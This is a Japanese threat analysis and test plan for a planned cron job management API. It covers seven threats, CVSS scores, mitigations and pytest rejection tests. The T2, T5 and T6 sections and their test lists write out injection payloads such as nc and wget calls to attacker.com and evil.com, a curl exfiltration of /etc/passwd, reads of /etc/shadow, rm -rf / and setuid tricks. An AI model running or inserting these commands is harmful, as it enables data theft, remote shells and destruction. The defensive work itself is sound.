# Cron Jobs モジュール - セキュリティ脅威分析レポート

**作成日**: 2026-02-14
**作成者**: cron-planner (v03-planning-team)
**対象モジュール**: Cron Jobs Management (Phase 3 v0.3)
**セキュリティレベル**: MEDIUM RISK
**ステータス**: 設計段階（実装前）

---

## 1. エグゼクティブサマリー

Cron Jobs管理モジュールは、定期実行タスクの管理機能を提供する**MEDIUM RISK**モジュールである。任意コマンド実行の入り口となり得るため、セキュリティ上の脅威は多岐にわたる。

本分析では **7つの脅威**を特定し、それぞれに対する緩和策を定義する。

### リスクサマリー

| 脅威 | 深刻度 | 発生可能性 | リスクレベル | 緩和策 |
|------|--------|-----------|------------|--------|
| T1: 任意コマンド実行 | CRITICAL | MEDIUM | HIGH | allowlist + 承認フロー |
| T2: コマンドインジェクション | CRITICAL | LOW | MEDIUM | 多重入力検証 |
| T3: リソース枯渇攻撃 | HIGH | MEDIUM | HIGH | ジョブ数制限 + 間隔制限 |
| T4: 機密情報漏洩 | HIGH | MEDIUM | MEDIUM | ログサニタイゼーション |
| T5: Cronジョブ乗っ取り | HIGH | LOW | MEDIUM | 所有者検証 + 承認フロー |
| T6: 権限昇格 | CRITICAL | LOW | MEDIUM | sudo最小化 + ラッパー経由 |
| T7: タイミング攻撃 | MEDIUM | LOW | LOW | 実行時刻分散 |

---

## 2. OWASP Top 10 (2021) との照合

| OWASP カテゴリ | 該当脅威 | 深刻度 | 対策状況 |
|--------------|---------|--------|---------|
| **A01:2021 - Broken Access Control** | T5 (ジョブ乗っ取り) | HIGH | 設計済み |
| **A02:2021 - Cryptographic Failures** | T4 (機密情報漏洩) | HIGH | 設計済み |
| **A03:2021 - Injection** | T1, T2 (コマンド実行/注入) | CRITICAL | 設計済み |
| **A04:2021 - Insecure Design** | T3 (リソース枯渇) | HIGH | 設計済み |
| **A05:2021 - Security Misconfiguration** | T6 (権限昇格) | CRITICAL | 設計済み |
| **A07:2021 - Identification and Authentication** | T5 (乗っ取り) | HIGH | 設計済み |
| **A09:2021 - Security Logging and Monitoring** | T4 (漏洩) | HIGH | 設計済み |

---

## 3. 脅威分析（詳細）

### T1: 任意コマンド実行

#### 概要

攻撃者がallowlist外のコマンドをCronジョブとして登録し、システム上で任意のコードを定期実行する。

#### 攻撃シナリオ

```
攻撃者: Operator ロールのユーザー（内部犯行）
目標: バックドアスクリプトの定期実行

ステップ:
1. POST /api/cron でallowlist外コマンドを指定
   - command: "/tmp/backdoor.sh"
   - schedule: "*/5 * * * *"
2. API層の検証をバイパスする試み
   - パストラバーサル: "/../../../tmp/backdoor.sh"
   - シンボリックリンク: "/usr/bin/rsync" -> 実際はsymlink
3. 承認者を騙して承認させる
   - reason: "Production backup script (urgent)"
```

#### 影響

- **機密性**: CRITICAL - システム全体のデータにアクセス可能
- **整合性**: CRITICAL - システムファイルの改ざん、バックドア設置
- **可用性**: HIGH - システムリソースの占有、破壊的操作

#### CVSS v3.1 スコア

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H
Base Score: 9.0 (CRITICAL)
```

※ UI:R = 承認者の操作が必要なため

#### 緩和策

| 緩和策 | 層 | 効果 |
|--------|---|------|
| **コマンドallowlist** | Service + Wrapper | コマンドを絶対パスで限定（最重要） |
| **承認フロー必須** | API | 人間による確認を強制 |
| **絶対パス必須** | Wrapper | `../` やシンボリックリンクの回避 |
| **realpath検証** | Wrapper | シンボリックリンク解決後にallowlist照合 |
| **監査ログ** | 全層 | 不正リクエストの追跡 |

#### 検証コード

```python
def test_reject_arbitrary_command():
    """allowlist外コマンドの拒否"""
    response = client.post("/api/cron", json={
        "schedule": "0 2 * * *",
        "command": "/tmp/backdoor.sh",
        "reason": "Test malicious command"
    })
    assert response.status_code == 403
    assert response.json()["code"] == "COMMAND_NOT_ALLOWED"

def test_reject_path_traversal():
    """パストラバーサルの拒否"""
    response = client.post("/api/cron", json={
        "schedule": "0 2 * * *",
        "command": "/usr/bin/../../../tmp/evil.sh",
        "reason": "Test path traversal"
    })
    assert response.status_code == 400
```

---

### T2: コマンドインジェクション

#### 概要

Cronジョブの引数フィールドにシェルメタ文字を挿入し、意図しないコマンドを実行する。

#### 攻撃シナリオ

```
攻撃者: Operator ロール
目標: 引数を経由した追加コマンド実行

ステップ:
1. allowlistコマンドを選択（/usr/bin/rsync）
2. 引数に悪意のある文字列を注入:
   - arguments: "-avz /data; rm -rf /"
   - arguments: "-avz /data | nc attacker.com 4444"
   - arguments: "-avz /data $(cat /etc/shadow)"
   - arguments: "-avz /data `wget attacker.com/shell.sh`"
3. 承認後、cronがコマンドを実行:
   - rsync -avz /data; rm -rf /
   → rsync 実行後に rm -rf / が実行される
```

#### 影響

- **機密性**: CRITICAL - 任意コマンド経由でデータ窃取
- **整合性**: CRITICAL - システム破壊が可能
- **可用性**: CRITICAL - rm -rf 等による完全破壊

#### CVSS v3.1 スコア

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H
Base Score: 9.0 (CRITICAL)
```

#### 緩和策

| 緩和策 | 層 | 効果 |
|--------|---|------|
| **禁止文字の完全拒否** | API + Service + Wrapper | `;|&$()` 等を含む入力を全拒否 |
| **引数の個別検証** | Service | 各引数をホワイトリストパターンで検証 |
| **クオーティング** | Wrapper | 配列渡しでshell展開を防止 |
| **承認フロー** | API | 人間が引数の妥当性を確認 |

#### 検証コード

```python
INJECTION_PAYLOADS = [
    "-avz /data; rm -rf /",
    "-avz /data | nc evil.com 4444",
    "-avz /data $(cat /etc/shadow)",
    "-avz /data `wget evil.com/shell.sh`",
    "-avz /data & /tmp/backdoor &",
    "-avz /data > /etc/crontab",
    "-avz /data < /dev/zero",
]

@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_reject_injection_in_arguments(payload):
    """引数内のインジェクション文字列を拒否"""
    response = client.post("/api/cron", json={
        "schedule": "0 2 * * *",
        "command": "/usr/bin/rsync",
        "arguments": payload,
        "reason": "Test injection payload"
    })
    assert response.status_code == 400
    assert "Forbidden character" in response.json()["message"]
```

---

### T3: リソース枯渇攻撃

#### 概要

大量のCronジョブを登録し、システムリソースを枯渇させる。または、極端に高頻度のジョブを登録して負荷をかける。

#### 攻撃シナリオ

```
攻撃者: Operator ロール
目標: システムの可用性低下

シナリオA - 大量登録:
1. 承認を繰り返し取得
2. 10個のジョブ × 複数ユーザー = システム全体で大量のジョブ
3. 全ジョブが同時刻に実行 → CPU/メモリ枯渇

シナリオB - 高頻度実行:
1. "* * * * *" (毎分実行) のジョブを登録
2. 重い処理を毎分実行 → リソース枯渇

シナリオC - 出力洪水:
1. 大量の標準出力を生成するジョブを登録
2. cron がメール送信 → ディスク/メール枯渇
```

#### 影響

- **機密性**: LOW - 直接的な情報漏洩なし
- **整合性**: LOW - 間接的な影響のみ
- **可用性**: HIGH - サービス停止の可能性

#### CVSS v3.1 スコア

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:H
Base Score: 5.2 (MEDIUM)
```

#### 緩和策

| 緩和策 | 層 | 効果 |
|--------|---|------|
| **ユーザーあたり最大10ジョブ** | Service + Wrapper | ジョブ数の上限制御 |
| **最小実行間隔 5分** | Service | `*/1 * * * *` 等の高頻度実行を拒否 |
| **システム全体の上限** | Service | 全ユーザー合計での上限（例: 50ジョブ） |
| **同時刻実行の分散** | Service | 同じ時刻に集中するジョブを警告 |
| **出力リダイレクト強制** | Wrapper | `>> /dev/null 2>&1` を自動付加 |

#### 検証コード

```python
def test_reject_exceeding_max_jobs():
    """ジョブ数上限超過の拒否"""
    # 10個のジョブを追加（上限）
    for i in range(10):
        create_approved_job(f"0 {i} * * *", "/usr/bin/rsync")

    # 11個目は拒否
    response = client.post("/api/cron", json={
        "schedule": "0 11 * * *",
        "command": "/usr/bin/rsync",
        "reason": "Test max jobs exceeded"
    })
    assert response.status_code == 409
    assert response.json()["code"] == "MAX_JOBS_EXCEEDED"

def test_reject_high_frequency_schedule():
    """高頻度スケジュールの拒否"""
    response = client.post("/api/cron", json={
        "schedule": "* * * * *",  # 毎分
        "command": "/usr/bin/rsync",
        "reason": "Test high frequency"
    })
    assert response.status_code == 400
    assert "interval" in response.json()["message"].lower()
```

---

### T4: 機密情報漏洩

#### 概要

Cronジョブのコマンド引数やログに機密情報（パスワード、APIキー等）が含まれ、閲覧権限を持つユーザーに露出する。

#### 攻撃シナリオ

```
攻撃者: Viewer ロール
目標: 他ユーザーのCronジョブに含まれる機密情報の取得

ステップ:
1. GET /api/cron で全ユーザーのジョブ一覧を取得（権限の不備を悪用）
2. 引数フィールドから以下を抽出:
   - curl -u admin:SecretPassword https://api.example.com
   - rsync -e "ssh -i /root/.ssh/id_rsa" ...
   - python3 script.py --api-key=sk-12345abcde
3. 取得した認証情報を悪用
```

#### 影響

- **機密性**: HIGH - 認証情報、APIキーの漏洩
- **整合性**: MEDIUM - 漏洩情報を使った攻撃
- **可用性**: LOW - 直接的な影響なし

#### CVSS v3.1 スコア

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N
Base Score: 7.1 (HIGH)
```

#### 緩和策

| 緩和策 | 層 | 効果 |
|--------|---|------|
| **自分のジョブのみ表示** | API | Viewerは自分のジョブのみ（Adminは全体） |
| **引数のマスキング** | API | パスワードパターンを `***` でマスク |
| **機密パターン検出** | Service | 登録時に機密情報を含む引数を警告 |
| **監査ログのサニタイゼーション** | Audit | ログ内のパスワード等をマスク |

#### 検証コード

```python
def test_viewer_cannot_see_other_users_jobs():
    """Viewerは他ユーザーのジョブを閲覧できない"""
    response = client.get("/api/cron?user=admin",
                          headers=viewer_auth_headers)
    assert response.status_code == 403

def test_mask_sensitive_arguments():
    """引数内の機密情報がマスクされる"""
    # "--password=secret" を含むジョブ
    response = client.get("/api/cron", headers=auth_headers)
    for job in response.json()["jobs"]:
        assert "secret" not in job.get("arguments", "")
```

---

### T5: Cronジョブ乗っ取り

#### 概要

攻撃者が他ユーザーのCronジョブを改ざんし、悪意のある操作に置き換える。

#### 攻撃シナリオ

```
攻撃者: Operator ロール
目標: Admin ユーザーの正規ジョブを悪意のあるものに置き換え

ステップ:
1. GET /api/cron?user=admin で Admin のジョブ一覧を取得
2. DELETE /api/cron/cron_001 で正規ジョブを削除
3. POST /api/cron で同じスケジュールの悪意あるジョブを追加
   - 正規: "0 2 * * * /usr/bin/rsync -avz /data /backup"
   - 悪意: "0 2 * * * /usr/bin/curl https://attacker.com/exfil?d=$(cat /etc/passwd)"
```

#### 影響

- **機密性**: HIGH - Admin 権限でのデータ窃取
- **整合性**: HIGH - 正規バックアップの停止、不正処理の実行
- **可用性**: MEDIUM - バックアップ機能の喪失

#### CVSS v3.1 スコア

```
CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:L
Base Score: 6.7 (MEDIUM)
```

#### 緩和策

| 緩和策 | 層 | 効果 |
|--------|---|------|
| **所有者検証** | API + Service | 自分のジョブのみ操作可能 |
| **承認フロー** | API | 全WRITE操作に承認必須 |
| **変更通知** | Service | ジョブ変更時に所有者へ通知 |
| **変更履歴** | Audit | 全変更操作の履歴保存 |
| **削除は無効化** | Service | 物理削除ではなくコメントアウト |

#### 検証コード

```python
def test_cannot_delete_other_users_job():
    """他ユーザーのジョブは削除できない"""
    response = client.delete("/api/cron/cron_001?reason=test",
                             headers=operator_auth_headers)
    assert response.status_code == 403
    assert response.json()["code"] == "OTHER_USER_JOB"
```

---

### T6: 権限昇格

#### 概要

Cronジョブを経由してroot権限でコマンドを実行し、通常のユーザー権限を超えた操作を行う。

#### 攻撃シナリオ

```
攻撃者: Operator ロール
目標: root 権限の取得

ステップ:
1. root の crontab にジョブを追加する試み:
   - POST /api/cron (user: "root")
2. SUID ビット付きスクリプトを作成する試み:
   - command: "/usr/bin/python3"
   - arguments: "-c 'import os; os.setuid(0)'"
3. sudoers ファイルを変更する試み:
   - command: "/usr/bin/find"
   - arguments: "/ -name sudoers -exec cat {} ;"
```

#### 影響

- **機密性**: CRITICAL - root権限でシステム全体にアクセス
- **整合性**: CRITICAL - システム全体の改ざん
- **可用性**: CRITICAL - システム全体の破壊

#### CVSS v3.1 スコア

```
CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H
Base Score: 8.3 (HIGH)
```

#### 緩和策

| 緩和策 | 層 | 効果 |
|--------|---|------|
| **root crontab操作禁止** | Wrapper | root ユーザーの crontab 操作を拒否 |
| **ユーザー名検証** | API + Wrapper | 許可されたユーザーのみ操作可能 |
| **引数のセキュリティ検証** | Service | 危険な引数パターンの検出 |
| **実行ユーザー制限** | Wrapper | crontabの所有者として許可されたユーザーのみ |
| **sudo最小化** | sudoers | ラッパースクリプトのみ許可 |

#### 検証コード

```python
def test_reject_root_crontab():
    """root ユーザーの crontab 操作を拒否"""
    response = client.post("/api/cron", json={
        "schedule": "0 2 * * *",
        "command": "/usr/bin/rsync",
        "user": "root",
        "reason": "Test root escalation"
    })
    assert response.status_code == 403

DANGEROUS_ARGUMENT_PATTERNS = [
    "-c 'import os; os.setuid(0)'",
    "-exec cat /etc/shadow ;",
    "-exec chmod 4777 {} ;",
    "--rsync-path='sudo rsync'",
]

@pytest.mark.parametrize("args", DANGEROUS_ARGUMENT_PATTERNS)
def test_reject_dangerous_arguments(args):
    """危険な引数パターンの拒否"""
    response = client.post("/api/cron", json={
        "schedule": "0 2 * * *",
        "command": "/usr/bin/find",
        "arguments": args,
        "reason": "Test dangerous args"
    })
    assert response.status_code == 400
```

---

### T7: タイミング攻撃

#### 概要

特定の時刻に脆弱なシステム状態を狙ってCronジョブを設定する。

#### 攻撃シナリオ

```
攻撃者: Operator ロール
目標: バックアップ実行中の一時ファイルへのアクセス

ステップ:
1. Admin のバックアップジョブのスケジュールを把握 (0 2 * * *)
2. 同時刻にジョブを登録:
   - schedule: "0 2 * * *"
   - command: "/usr/bin/find"
   - arguments: "/tmp -name '*.bak' -newer /tmp/marker"
3. バックアップの一時ファイルにアクセス
```

#### 影響

- **機密性**: MEDIUM - 一時ファイル経由の情報漏洩
- **整合性**: LOW - 間接的な影響のみ
- **可用性**: LOW - 直接的な影響なし

#### CVSS v3.1 スコア

```
CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N
Base Score: 2.6 (LOW)
```

#### 緩和策

| 緩和策 | 層 | 効果 |
|--------|---|------|
| **同時刻実行の警告** | Service | 同一時刻のジョブ集中を検出・警告 |
| **一時ファイルのパーミッション** | System | umask 077 で一時ファイルを保護 |
| **承認時の時刻確認** | UI | 承認画面で既存ジョブとの時刻重複を表示 |

---

## 4. 攻撃ツリー

```
Root: Cronジョブ経由でのシステム侵害
├── [AND] 1. 悪意のあるジョブの登録
│   ├── [OR] 1a. allowlistバイパス
│   │   ├── パストラバーサル (/usr/bin/../../../tmp/evil.sh)
│   │   ├── シンボリックリンク攻撃
│   │   └── Unicode/エンコーディング攻撃
│   ├── [OR] 1b. 引数インジェクション
│   │   ├── シェルメタ文字 (;|&$`...)
│   │   ├── コマンド置換 ($(...) / `...`)
│   │   └── リダイレクト (> < >>)
│   └── [OR] 1c. 承認者を騙す
│       ├── 正当な理由の偽装
│       └── 承認疲れの悪用
├── [AND] 2. 権限昇格
│   ├── root crontab への書き込み
│   ├── SUID ビット付きファイルの作成
│   └── sudoers ファイルの改ざん
└── [AND] 3. 検出回避
    ├── ログの削除/改ざん
    ├── 監査記録の回避
    └── ジョブの一時的な有効化/無効化
```

---

## 5. リスク評価マトリクス

| 脅威ID | 脅威名 | 深刻度 | 発生可能性 | 検出難易度 | 総合リスク | 残存リスク（緩和後） |
|--------|--------|--------|-----------|-----------|-----------|------------------|
| T1 | 任意コマンド実行 | 9.0 | MEDIUM | EASY | **HIGH** | LOW (allowlist) |
| T2 | コマンドインジェクション | 9.0 | LOW | EASY | **MEDIUM** | LOW (多重検証) |
| T3 | リソース枯渇攻撃 | 5.2 | MEDIUM | EASY | **MEDIUM** | LOW (制限) |
| T4 | 機密情報漏洩 | 7.1 | MEDIUM | MEDIUM | **MEDIUM** | LOW (マスキング) |
| T5 | Cronジョブ乗っ取り | 6.7 | LOW | MEDIUM | **MEDIUM** | LOW (所有者検証) |
| T6 | 権限昇格 | 8.3 | LOW | EASY | **MEDIUM** | LOW (root拒否) |
| T7 | タイミング攻撃 | 2.6 | LOW | HARD | **LOW** | LOW (警告) |

---

## 6. セキュリティテスト要件

### 6.1 必須テストケース数

| カテゴリ | テストケース数 | 備考 |
|---------|-------------|------|
| allowlist検証 | 15+ | 全許可コマンド + 全禁止コマンド |
| インジェクション検証 | 20+ | 各メタ文字、エンコーディング |
| 権限検証 | 10+ | ロール別アクセス制御 |
| 所有者検証 | 5+ | 他ユーザージョブ操作の拒否 |
| リソース制限 | 5+ | ジョブ数上限、頻度制限 |
| 承認フロー | 5+ | 承認/却下/タイムアウト |
| 合計 | **60+** | |

### 6.2 ペネトレーションテスト項目

- [ ] allowlistバイパスの試行（パストラバーサル、symlink、Unicode）
- [ ] 引数インジェクションの全パターン試行
- [ ] 認証なしでのAPI呼び出し
- [ ] 権限昇格の試行（root crontab操作）
- [ ] レート制限の検証
- [ ] CSRF攻撃の試行
- [ ] ラッパースクリプトの直接呼び出し試行

---

## 7. 推奨事項

### 7.1 実装優先度

1. **最優先**: allowlist検証 + 禁止文字拒否（T1, T2）
2. **高優先**: ジョブ数制限 + 所有者検証（T3, T5）
3. **中優先**: ログサニタイゼーション + root拒否（T4, T6）
4. **低優先**: タイミング警告（T7）

### 7.2 継続的セキュリティ活動

- allowlistの定期レビュー（四半期ごと）
- セキュリティテストの自動実行（CI/CD）
- 監査ログの定期確認
- インシデント対応手順の整備

---

## 8. 関連ドキュメント

- [docs/architecture/cron-jobs-design.md](../architecture/cron-jobs-design.md) - アーキテクチャ設計
- [docs/security/cron-allowlist-policy.md](cron-allowlist-policy.md) - allowlistポリシー
- [docs/security/THREAT_ANALYSIS_PROCESSES.md](THREAT_ANALYSIS_PROCESSES.md) - Processesモジュール脅威分析（参考）
- [SECURITY.md](../../SECURITY.md) - セキュリティポリシー

---

**最終更新**: 2026-02-14
**次回レビュー**: 実装開始前にセキュリティレビュー必須
